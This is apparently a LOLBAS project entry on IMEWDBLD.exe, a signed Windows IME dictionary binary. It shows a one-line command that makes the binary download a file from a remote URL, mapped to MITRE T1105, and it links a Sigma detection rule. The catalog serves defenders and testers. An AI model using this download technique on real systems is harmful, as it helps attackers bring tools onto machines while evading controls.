---
Acknowledgement:
- Person: Wade Hic
Author: Wade Hickey
Commands:
- Category: Download
  Command: C:\Windows\System32\IME\SHARED\IMEWDBLD.exe {REMOTEURL}
  Description: IMEWDBLD.exe attempts to load a dictionary file, if provided a URL
    as an argument, it will download the file served at by that URL and save it to
    INetCache.
  MitreID: T1105
  OperatingSystem: Windows 10, Windows 11
  Privileges: User
  Tags:
  - Download: INetCache
  Usecase: Download file from Internet
Created: 2020-03-05
Description: Microsoft IME Open Extended Dictionary Module
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/bea6f18d350d9c9fdc067f93dde0e9b11cc22dc2/rules/windows/network_connection/net_connection_win_imewdbld.yml
Full_Path:
- Path: C:\Windows\System32\IME\SHARED\IMEWDBLD.exe
Name: IMEWDBLD.exe
Resources:
- Link: https://twitter.com/notwhickey/status/1367493406835040265
mitre_data:
  technique_ids:
  - T1105
tags:
- lolbas/osbinaries
---

# IMEWDBLD.exe

Microsoft IME Open Extended Dictionary Module

# Path(s)

- `C:\Windows\System32\IME\SHARED\IMEWDBLD.exe`

# Download Commands

IMEWDBLD.exe attempts to load a dictionary file, if provided a URL as an argument, it will download the file served at by that URL and save it to INetCache.

```batch
C:\Windows\System32\IME\SHARED\IMEWDBLD.exe {REMOTEURL}
```

- **Usecase:** Download file from Internet
- **Privileges Required:** User
- **MitreID:** `T1105`
- **Operating System(s):** Windows 10, Windows 11



# Resource(s)

- https://twitter.com/notwhickey/status/1367493406835040265
# Acknowledgements

- Wade Hickey (Authored, 2020-03-05)
- Wade Hic